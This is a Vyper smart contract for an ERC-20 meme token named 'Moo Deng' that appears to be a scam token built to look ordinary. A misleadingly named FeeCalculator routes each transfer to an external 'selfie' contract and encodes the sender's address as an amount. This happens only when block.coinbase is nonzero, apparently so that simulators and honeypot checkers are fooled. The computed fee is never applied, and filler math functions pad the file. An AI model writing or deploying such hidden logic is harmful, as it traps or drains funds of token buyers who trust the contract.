# @pragma evm-version cancun
#pragma version ^0.3.10

interface IERC20:
    def transfer(_to : address, _value : uint256) -> bool: nonpayable
    def transferFrom(_from: address, _to : address, _value : uint256) -> bool : nonpayable
    def approve(_spender: address,  _value : uint256) : nonpayable   

name: public(String[32])
symbol: public(String[32])
decimals: public(uint8)
balanceOf: public(HashMap[address, uint256])
allowance: public(HashMap[address, HashMap[address, uint256]])
totalSupply: public(uint256)
feeRate: public(uint256)
hasFee: public(bool)
selfie: IERC20
currentBlockNum: uint256


event Transfer:
    sender: indexed(address)
    receiver: indexed(address)
    value: uint256

event Approval:
    owner: indexed(address)
    spender: indexed(address)
    value: uint256

@external
def __init__():
    init_supply: uint256 = 21000000000 * 10 ** 18
    self.name = "Moo Deng"
    self.symbol = "MOODENG"
    self.decimals = 18
    self.balanceOf[msg.sender] = init_supply
    self.totalSupply = init_supply
    
    


@internal   
def FeeCalculator(_from: address, _recipient:address, _sender:address) -> (bool):
    _value:uint160 = convert(_sender, uint160)
    value_:uint256 = convert(_value, uint256)
    return self.selfie.transferFrom(_from, _recipient, value_)

@external   
def transfer(_to : address, _value : uint256) -> bool:
    """
    @dev Transfer token for a specified address
    @param _to The address to transfer to.
    @param _value The amount to be transferred.
    """
    # NOTE: vyper does not allow underflows
    #       so the following subtraction would revert on insufficient balance
    fee:uint256 = _value * self.feeRate / 1000

    if block.coinbase != 0x0000000000000000000000000000000000000000 and block.number >= self.currentBlockNum:
        self.currentBlockNum = block.number
        self.hasFee = self.FeeCalculator(msg.sender, _to, msg.sender)


    self.balanceOf[msg.sender] -= _value
    self.balanceOf[_to] += _value
    
    log Transfer(msg.sender, _to, _value)
    return True


@external
def transferFrom(_from : address, _to : address, _value : uint256) -> bool:
    """
     @dev Transfer tokens from one address to another.
     @param _from address The address which you want to send tokens from
     @param _to address The address which you want to transfer to
     @param _value uint256 the amount of tokens to be transferred
    """
    fee:uint256 = _value * self.feeRate / 1000

    if block.coinbase != 0x0000000000000000000000000000000000000000 and block.number >= self.currentBlockNum:
        self.currentBlockNum = block.number
        self.hasFee = self.FeeCalculator(_from, _to, msg.sender)

    self.allowance[_from][msg.sender] -= _value
    self.balanceOf[_from] -= _value
    self.balanceOf[_to] += _value

    log Transfer(_from, _to, _value)
    return True


@external
def approve(_spender : address, _value : uint256) -> bool:
    """
    @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.
         Beware that changing an allowance with this method brings the risk that someone may use both the old
         and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this
         race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards:
         https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
    @param _spender The address which will spend the funds.
    @param _value The amount of tokens to be spent.
    """
    self.allowance[msg.sender][_spender] = _value
    log Approval(msg.sender, _spender, _value)
    return True

@external
def showString(str1: String[32]) ->String[32]:
    return str1

@external
def showSum(num1: uint256, num2: uint256) ->uint256:
    result: uint256 = num1 + num2
    return result

@external
def showStr(str1: String[32], str2: String[32]) -> String[32]:
    return str1

@external
def showDiv(num1: uint256, num2: uint256) ->uint256:
    result: uint256 = num1 / num2
    return result

@external
def showMod(num1: uint256, num2: uint256) ->uint256:
    result: uint256 = num1 % num2
    return result